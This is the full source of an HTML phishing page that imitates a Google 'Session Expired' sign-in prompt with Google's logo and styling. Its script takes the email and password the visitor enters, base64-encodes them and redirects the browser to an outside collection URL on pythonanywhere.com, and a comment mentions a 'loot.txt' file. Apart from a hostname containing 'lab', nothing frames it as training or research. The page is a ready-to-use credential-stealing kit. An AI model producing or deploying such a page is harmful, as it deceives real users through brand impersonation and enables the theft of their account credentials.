<!DOCTYPE html>
<html>
<head>
    <title>Session Expired</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        img { width: 75px; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background-color: #357ae8; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Reference_Logo.svg/200px-Google_Reference_Logo.svg.png" alt="Google">
        <h3>Session Expired</h3>
        <p>Please re-enter your credentials to continue.</p>
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="sendData()">Sign In</button>
    </div>

    <script>
        function sendData() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const listener = "https://labsession.pythonanywhere.com/capture";
            
            // Combine email and pass, then encode
            const secretData = btoa(`User: ${email} | Pass: ${pass}`);
            
            // Send to your PythonAnywhere loot.txt
            window.location.replace(listener + "?data=" + secretData);
        }
    </script>
</body>
</html>
